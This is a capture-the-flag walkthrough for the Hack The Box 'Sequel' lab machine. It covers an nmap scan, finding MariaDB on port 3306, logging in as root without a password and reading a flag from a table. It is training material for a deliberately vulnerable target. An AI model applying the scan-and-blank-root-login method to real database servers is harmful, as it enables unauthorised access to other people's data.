# Sequel
## Very Easy

## Solution

Sequel is a Linux based machine, once the machine is started. Connect to the hackthebox network using VPN (which can be downloaded from hackthebox) 
```
sudo openvpn <openvpn file>
```
The format of completing the box is by answering the questions, the answers can be found when trying find the flag inside the machine. 

Start by seeing if the machine IP is reachable using ```ping```, 
```
ping -c 4 <IP>
```
Enumerating the machine IP using ```nmap``` to find the services/ports available. Use ```-sC``` option to run safe scripts.
```
sudo nmap -sC -v -T5  <IP>
```
The output of the scan is,
```
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 117
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolOld, FoundRows, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, IgnoreSigpipes, ODBCClient, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: O/>(N2LiJt.#cK.DI#p.
|_  Auth Plugin Name: mysql_native_password
```

To access MySQL, use the following commands 
```
mysql -h <IP>  -u <username> -p
```
The prompt for the password would given, but to login without password in MariaDB use the username ```root```

If mysql program doesn't connect to the IP, instead shows TLS/SSL error use ```--skip-ssl``` at the end;
```
mysql -h <IP> -u <username> --skip-ssl
```
After connecting to the MySQL MariaDB platform, use ```show databases;``` to show what all databases are available and to select one database use ```use <DB-Name>;```

After selecting one database, use the command ```show tables;``` to show different tables within the database.

To dispaly the contents of each table, use command ```select * from <table-name>``` and one of the table has flag in it.

